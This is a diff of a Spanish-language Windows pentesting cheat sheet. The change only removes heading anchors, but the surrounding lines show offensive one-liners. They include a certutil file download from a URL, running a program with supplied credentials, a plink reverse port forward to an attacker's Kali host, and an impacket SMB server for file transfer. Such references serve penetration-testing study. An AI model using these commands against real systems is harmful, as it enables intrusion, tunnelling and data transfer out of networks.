@@ -85,29 +85,29 @@ netsh advfirewall firewall dump
 	[bitsadmin/wesng: Windows Exploit Suggester - Next Generation (github.com)](https://github.com/bitsadmin/wesng)
 
 ````
-## Funciones básicas[](#funciones-basicas)
+## Funciones básicas
 
 ### Descarga de archivos[](#descarga-de-archivos)
 
 ```python
 certutil.exe -urlcache -f <URL> <OUTPUT_FILE>
 ```
-### Comprobación de permisos sobre un archivo[](#comprobacion-de-permisos-sobre-un-archivo)
+### Comprobación de permisos sobre un archivo
 
 ```python
 accesschk.exe /accepteula -quvw <user> <Ruta absoluta del archivo>
 ```
-### Ejecución de un programa como otro usuario en Powershell[](#ejecucion-de-un-programa-como-otro-usuario-en-powershell)
+### Ejecución de un programa como otro usuario en Powershell
 
 ```python
 powershell -c "$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential('<USER>', $password);Start-Process -FilePath "<PROGRAM.EXE>" -Credential $creds"
 ```
-### Windows Port Forwarding[](#windows-port-forwarding)
+### Windows Port Forwarding
 
 ```python
 plink.exe -l <KALI_USER> -pw <KALI_USER_PASS> -R <KALI_PORT>:<LOCAL_IP/LOCALHOST_IP>:<LOCAL_PORT> <KALI_IP>
 ```
-### Transferencia de archivos mediante smb[](#transferencia-de-archivos-mediante-smb)
+### Transferencia de archivos mediante smb
 
 ```python
 sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali . #Kali
